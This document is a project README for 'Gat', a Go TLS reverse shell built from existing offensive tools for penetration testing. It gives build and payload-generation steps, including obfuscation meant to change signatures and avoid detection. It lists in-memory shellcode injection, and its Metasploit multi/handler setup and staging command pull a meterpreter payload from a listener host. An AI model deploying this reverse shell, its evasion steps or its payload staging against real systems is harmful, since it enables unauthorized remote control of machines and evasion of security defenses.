# Gat
Golang Access Tool

Simple TCP reverse shell written in [Go](https://golang.org).
It uses TLS to secure the communications, and provide a certificate public key fingerprint pinning feature, preventing from traffic interception.

###Note: I dont take credit for the majority of this code. This is a combination of two tools i use often in pentest with slight tweaks to change signatures and a script to automate the deployment of said tools.

Supported OS are:

- Windows
- Linux
- Mac OS
- FreeBSD and derivatives

## Getting started & dependencies

Since this is a Go project, you will need to follow the [official documentation](https://golang.org/doc/install) to set up
your Golang environment.\
(with the `$GOPATH` environment variable).\

Prerequisite

```
go install mvdan.cc/garble@latest
```


```
git clone https://github.com/m1ddl3w4r3/Gat.git
cd Gat
go mod init Gat/Gat
go mod tidy
cd utils/
go build Mangle.go
```
## Usage
Gat will use 'MSF's Multi Handler' by default.(If listener selected)\
##Gat.sh to make things easy.
***WARNING*** Change CN in make file to accurately reflect you Orgs Certificate or Hostname of HTTPS server.
```
./Gat.sh - Will show example and ascii art.
./Gat.sh [ Windows|Mac|Linux ] <LHOST> <LPORT> - Will generate given OS type payload.
./Gat.sh Cleanup - Will cleanup past deployments.
```

This custom interactive shell will allow you to execute system commands through `cmd.exe` on Windows, or `/bin/sh` on UNIX machines.

The following special commands are supported:

* ``run_shell`` : drops you an system shell (allowing you, for example, to change directories)
* ``inject <base64 shellcode>`` : injects a shellcode (base64 encoded) in the same process memory, and executes it
* ``meterpreter [tcp|http|https] IP:PORT`` : connects to a multi/handler to get a stage2 reverse tcp, http or https meterpreter agent from metasploit, and execute the shellcode in memory (Windows only at the moment)
* ``exit`` : exit gracefully


## Examples

### Basic usage

## Meterpreter staging
**WARNING**: this currently only work for the Windows platform.

The meterpreter staging currently supports the following payloads :

* `windows/x64/meterpreter/reverse_tcp`
* `windows/x64/meterpreter/reverse_http`
* `windows/x64/meterpreter/reverse_https`

To use the correct one, just specify the transport you want to use (tcp, http, https)
To use the meterpreter staging feature, just start your handler:

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 127.0.0.1
set lport 8443
set HandlerSSLCert ./server.pem
exploit -j
```

Then, in `Gat`, use the `meterpreter` command:

```bash
[Gat]> meterpreter https 127.0.0.1:8443
```
A new meterpreter session should pop in `msfconsole`:

## Credits
Ronan Kervella `<r.kervella -at- sysdream -dot- com>` - For his [Hershell](https://github.com/lesnuages.hershell) repo.\
@Tyl0us - For his awesome work on [Mangle](https://github.com/optiv/mangle).
